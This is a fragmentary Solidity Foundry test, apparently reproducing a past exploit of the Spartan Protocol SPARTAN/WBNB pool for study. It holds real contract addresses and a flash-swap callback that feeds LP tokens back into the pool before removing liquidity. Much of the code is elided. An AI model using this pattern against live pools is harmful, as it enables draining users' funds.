...
contract Exploit is Test {
    ...
    IERC20 private constant SPARTA =
        IERC20(0xE4Ae305ebE1AbE663f261Bc00534067C80ad677C);

    IUniswapV2Pair private constant CAKE_WBNB =
        IUniswapV2Pair(0x0eD7e52944161450477ee417DE9Cd3a859b14fD0);

    ISpartanPool private constant SPT1_WBNB =
        ISpartanPool(0x3de669c4F1f167a8aFBc9993E4753b84b576426f); // SPARTAN<>WBNB
    ...
    function pancakeCall(
        ...
        SPT1_WBNB.transfer(
            address(SPT1_WBNB),
            SPT1_WBNB.balanceOf(address(this))
        ); // transfer LP tokens into the pool
        ...
        IERC20(address(SPT1_WBNB)).transfer(
            address(SPT1_WBNB),
            IERC20(address(SPT1_WBNB)).balanceOf(address(this))
        );
...
interface ISpartanPool {
    ...
    function removeLiquidity()
        external
        returns (uint256 outputBase, uint256 outputToken);
